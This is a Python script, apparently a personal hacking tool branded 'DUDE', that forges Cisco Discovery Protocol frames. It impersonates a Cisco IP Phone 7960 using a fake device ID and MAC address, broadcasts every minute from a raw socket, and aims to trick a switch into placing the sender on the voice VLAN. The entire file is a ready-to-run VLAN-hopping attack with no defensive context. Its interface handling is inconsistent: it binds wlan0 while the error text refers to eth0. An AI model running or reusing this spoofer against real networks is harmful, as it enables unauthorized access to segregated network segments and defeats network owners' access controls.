import socket
import struct
import time

# DUDE'S CDP SPOOFER
# Mimics a Cisco IP Phone to trigger Voice VLAN assignment.
# NOTE: Requires RAW SOCKETS (Root).

def build_cdp_packet():
    # LLC Header (DSAP=AA, SSAP=AA, Ctrl=03) + SNAP (OUI=00000C, PID=2000)
    llc_snap = b'\xaa\xaa\x03\x00\x00\x0c\x20\x00'
    
    # CDP Header: Ver(1), TTL(180), Cksum(0)
    cdp_ver = 1
    cdp_ttl = 180
    cdp_cksum = 0
    
    cdp_header_base = struct.pack('!BBH', cdp_ver, cdp_ttl, cdp_cksum)
    
    # TLVs (Type, Length, Value)
    
    # Device ID (Type 0x0001) - "SEP001122334455"
    dev_id = b"SEP001122334455"
    tlv_dev = struct.pack('!HH', 0x0001, len(dev_id)+4) + dev_id
    
    # Address (Type 0x0002) - 192.168.0.34
    # Protocol ID (1=IP), Length(1), IP
    proto_ip = b'\x01\x01\xcc\x01' # Fake IP bytes
    addr_val = struct.pack('!I', 1) + proto_ip + socket.inet_aton("192.168.0.34")
    tlv_addr = struct.pack('!HH', 0x0002, len(addr_val)+4) + addr_val

    # Port ID (Type 0x0003) - "Port 1"
    port_id = b"Port 1"
    tlv_port = struct.pack('!HH', 0x0003, len(port_id)+4) + port_id
    
    # Capabilities (Type 0x0004) - Host(0x10) + Phone(0x20) = 0x30
    caps = struct.pack('!I', 0x00000030)
    tlv_caps = struct.pack('!HH', 0x0004, len(caps)+4) + caps
    
    # Version (Type 0x0005) - "Cisco IP Phone 7960"
    ver_str = b"Cisco IP Phone 7960"
    tlv_ver = struct.pack('!HH', 0x0005, len(ver_str)+4) + ver_str
    
    # Platform (Type 0x0006) - "Cisco IP Phone 7960"
    plat_str = b"Cisco IP Phone 7960"
    tlv_plat = struct.pack('!HH', 0x0006, len(plat_str)+4) + plat_str
    
    payload = cdp_header_base + tlv_dev + tlv_addr + tlv_port + tlv_caps + tlv_ver + tlv_plat
    
    return llc_snap + payload

def send_cdp():
    print("[*] DUDE: Initializing CDP Spoofing...")
    print("[*] DUDE: Broadcasting identity: 'Cisco IP Phone 7960'")
    
    try:
        # We need a raw socket. On Linux, this requires ROOT.
        # We broadcast to the CDP Multicast Address: 01:00:0c:cc:cc:cc
        # But raw sockets in Python usually need an interface name for binding.
        # We'll try to use standard socket if possible, but CDP is Layer 2.
        # Python's socket library doesn't easily do L2 without 'AF_PACKET'.
        
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind(("wlan0", 0)) # Using wlan0 as identified by ip a
        
        # Ethernet Header
        # Dest: 01:00:0c:cc:cc:cc (Cisco CDP/VTP/DTP)
        # Src:  00:11:22:33:44:55 (Fake)
        # Type: Length (CDP uses 802.3 LLC, so this is length)
        
        packet = build_cdp_packet()
        eth_len = len(packet)
        
        eth_header = struct.pack('!6s6sH', 
                                 b'\x01\x00\x0c\xcc\xcc\xcc', 
                                 b'\x00\x11\x22\x33\x44\x55', 
                                 eth_len)
        
        full_frame = eth_header + packet
        
        while True:
            s.send(full_frame)
            print("[+] DUDE: CDP Packet Sent. Waiting 60s...")
            time.sleep(60)
            
    except PermissionError:
        print("[!] DUDE: You need ROOT (sudo) to forge Raw Packets!")
    except OSError as e:
        print(f"[!] DUDE: Interface error. Check if 'eth0' exists. Error: {e}")
        print("[*] DUDE: Hint - Change 'eth0' in the script to 'wlan0' or your interface.")

if __name__ == "__main__":
    send_cdp()
